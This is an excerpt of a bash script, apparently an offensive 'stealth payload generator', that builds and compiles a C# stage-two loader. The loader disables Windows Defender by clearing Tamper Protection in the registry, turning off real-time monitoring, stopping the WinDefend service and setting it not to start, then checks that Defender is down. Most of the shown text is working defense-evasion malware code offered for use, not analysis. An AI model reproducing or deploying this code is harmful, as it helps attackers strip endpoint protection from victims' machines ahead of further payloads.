#!/bin/bash
# pgen.sh - ULTIMATE STEALTH Payload Generator – All‑in‑One Defender Disabler + Syscall Loader
...
# ========== C# STAGE2 LOADER (EXE) – Embedded Defender Disabler ==========
echo -e "${YELLOW}[3/5] Creating C# Stage2 loader (embedded defender disabler)...${NC}"
    ...
    class Program
    {
        ...
        static void Main()
        {
            ...
            try
            {
                ...
                // 1. Disable Tamper Protection via registry
                try {
                    RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Features", true);
                    if (key != null) {
                        key.SetValue("TamperProtection", 0, RegistryValueKind.DWord);
                        key.Close();
                        Log("Tamper protection disabled.");
                    } else {
                        Log("Tamper protection key not found.");
                    }
                } catch (Exception ex) {
                    Log("Error disabling tamper protection: " + ex.Message);
                }
                ...
                try {
                    ...
                    Log("Real-time monitoring disabled.");
                } catch (Exception ex) {
                    Log("Error disabling real-time monitoring: " + ex.Message);
                }
                Thread.Sleep(5000);

                // 3. Stop Windows Defender service and disable it
                try {
                    ServiceController sc = new ServiceController("WinDefend");
                    if (sc.Status == ServiceControllerStatus.Running) {
                        sc.Stop();
                        sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(30));
                        Log("WinDefend service stopped.");
                    }
                    // Disable startup
                    Process.Start("sc", "config WinDefend start= disabled");
                    Log("WinDefend startup set to disabled.");
                } catch (Exception ex) {
                    Log("Error stopping/disabling WinDefend: " + ex.Message);
                }

                // 4. Verify Defender is off
                bool defenderRunning = true;
                int retries = 0;
                while (defenderRunning && retries < 5)
                {
                    try {
                        ServiceController sc = new ServiceController("WinDefend");
                        if (sc.Status == ServiceControllerStatus.Running)
                        {
                            Log("WinDefend still running, waiting 10 more seconds...");
                            Thread.Sleep(10000);
                            retries++;
                        }
                        else
                        ...
                        // Service might not exist – assume it's off
                        defenderRunning = false;
                        Log("WinDefend service not found – assuming disabled.");
                    }
                }
...
# Compile the C# code with required references
if command -v mcs >/dev/null 2>&1; then
    mcs -target:exe -out:payloads/stage2.exe tools/stage2.cs -r:System.ServiceProcess.dll -r:Microsoft.Win32.Registry.dll
